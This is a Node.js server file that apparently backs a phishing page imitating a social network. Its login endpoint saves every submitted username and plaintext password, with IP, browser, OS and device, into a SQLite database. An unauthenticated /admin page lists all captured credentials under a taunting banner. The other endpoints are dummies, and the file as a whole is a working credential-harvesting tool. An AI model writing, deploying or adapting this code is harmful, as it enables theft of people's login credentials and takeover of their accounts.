const http = require('http');
const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const PORT = 4000;

// Create/Connect to SQLite database (persists data)
const db = new sqlite3.Database('./data/logins.db');

// Create table if not exists
db.run(`
    CREATE TABLE IF NOT EXISTS logins (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT,
        password TEXT,
        time TEXT,
        ip TEXT,
        browser TEXT,
        os TEXT,
        device TEXT
    )
`);

const server = http.createServer((req, res) => {
    console.log('👉', req.method, req.url);
    
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }
    
    // Serve frontend
    if (req.url === '/' && req.method === 'GET') {
        fs.readFile(path.join(__dirname, '../frontend/index.html'), (err, data) => {
            if (err) {
                res.writeHead(404);
                res.end('index.html not found');
            } else {
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(data);
            }
        });
    }
    
    // LOGIN API - Save to DATABASE
    else if (req.url === '/api/login' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            let data = JSON.parse(body);
            const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
            const userAgent = req.headers['user-agent'] || 'Unknown';
            
            let browser = 'Unknown';
            if (userAgent.includes('Chrome')) browser = 'Chrome';
            else if (userAgent.includes('Firefox')) browser = 'Firefox';
            else if (userAgent.includes('Safari')) browser = 'Safari';
            else if (userAgent.includes('Edge')) browser = 'Edge';
            
            let os = 'Unknown';
            if (userAgent.includes('Windows')) os = 'Windows';
            else if (userAgent.includes('Mac')) os = 'Mac';
            else if (userAgent.includes('Android')) os = 'Android';
            else if (userAgent.includes('iPhone')) os = 'iOS';
            
            let device = 'Desktop';
            if (userAgent.includes('Mobile')) device = 'Mobile';
            else if (userAgent.includes('Tablet')) device = 'Tablet';
            
            // SAVE TO DATABASE (Permanent)
            db.run(`
                INSERT INTO logins (username, password, time, ip, browser, os, device)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            `, [data.username, data.password, new Date().toLocaleString(), ip, browser, os, device]);
            
            console.log('💾 Login saved to database:', data.username);
            
            if (data.username === 'admin' && data.password === '123456') {
                res.end(JSON.stringify({ success: true }));
            } else {
                res.end(JSON.stringify({ success: false }));
            }
        });
    }
    
    // GET POSTS (dummy)
    else if (req.url === '/api/posts' && req.method === 'GET') {
        res.end(JSON.stringify([]));
    }
    
    // CREATE POST (dummy)
    else if (req.url === '/api/posts' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            res.end(JSON.stringify({ success: true }));
        });
    }
    
    // DELETE POST (dummy)
    else if (req.url.match(/\/api\/posts\/(.+)/) && req.method === 'DELETE') {
        res.end(JSON.stringify({ success: true }));
    }
    
    // LIKE POST (dummy)
    else if (req.url.match(/\/api\/posts\/(.+)\/like/) && req.method === 'POST') {
        res.end(JSON.stringify({ success: true }));
    }
    
    // ADMIN PANEL - Get data from DATABASE
    else if (req.url === '/admin') {
        db.all("SELECT * FROM logins ORDER BY id DESC", (err, rows) => {
            let logsHtml = '';
            for (let row of rows) {
                logsHtml += `
                    <tr>
                        <td>${row.id}</td>
                        <td><strong>${escapeHtml(row.username)}</strong></td>
                        <td style="color:#ff6b6b;"><strong>${escapeHtml(row.password)}</strong></td>
                        <td>${row.time}</td>
                        <td>${row.ip}</td>
                        <td>${row.browser}</td>
                        <td>${row.os}</td>
                        <td>${row.device}</td>
                    </tr>
                `;
            }
            
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(`
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Admin Panel - Permanent Database</title>
                    <style>
                        body { background: #0a0e27; color: #00ff88; font-family: monospace; padding: 20px; }
                        h1 { color: #1877f2; text-align: center; }
                        .stats { background: #1a1f3e; padding: 20px; border-radius: 10px; margin: 20px 0; text-align: center; }
                        .stats .number { font-size: 48px; font-weight: bold; color: #00ff88; }
                        table { width: 100%; border-collapse: collapse; background: #1a1f3e; border-radius: 10px; overflow-x: auto; display: block; }
                        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #2a2f4e; font-size: 12px; }
                        th { background: #1877f2; color: white; position: sticky; top: 0; }
                        .finger { font-size: 50px; text-align: center; margin: 20px; }
                        .refresh-btn { background: #1877f2; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 20px 0; }
                    </style>
                </head>
                <body>
                    <h1>🔧 ADMIN PANEL - PERMANENT DATABASE 🔧</h1>
                    <div class="stats">
                        <div class="number">${rows.length}</div>
                        <div>Total Login Attempts (Saved Permanently)</div>
                    </div>
                    <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
                    <h2>📋 ALL LOGIN ATTEMPTS (Data persists after restart!)</h2>
                    <div style="overflow-x: auto;">
                        <table>
                            <thead>
                                <tr>
                                    <th>ID</th>
                                    <th>USERNAME</th>
                                    <th>PASSWORD</th>
                                    <th>TIME</th>
                                    <th>IP</th>
                                    <th>BROWSER</th>
                                    <th>OS</th>
                                    <th>DEVICE</th>
                                </tr>
                            </thead>
                            <tbody>
                                ${logsHtml || '<tr><td colspan="8" style="text-align:center;">No logins yet</td></tr>'}
                            </tbody>
                        </table>
                    </div>
                    <div class="finger">🖕 DATA NOW PERSISTENT 🖕</div>
                </body>
                </html>
            `);
        });
    }
    
    else {
        res.writeHead(404);
        res.end('404');
    }
});

function escapeHtml(text) {
    if (!text) return 'Unknown';
    return text.replace(/[&<>]/g, function(m) {
        if (m === '&') return '&amp;';
        if (m === '<') return '&lt;';
        if (m === '>') return '&gt;';
        return m;
    });
}

server.listen(PORT, () => {
    console.log('\n🚀 ==================================');
    console.log('   SERVER WITH PERMANENT DATABASE!');
    console.log('==================================');
    console.log(`📱 Frontend: http://localhost:${PORT}`);
    console.log(`🔧 Admin:    http://localhost:${PORT}/admin`);
    console.log('💾 Data now persists after server restart!\n');
});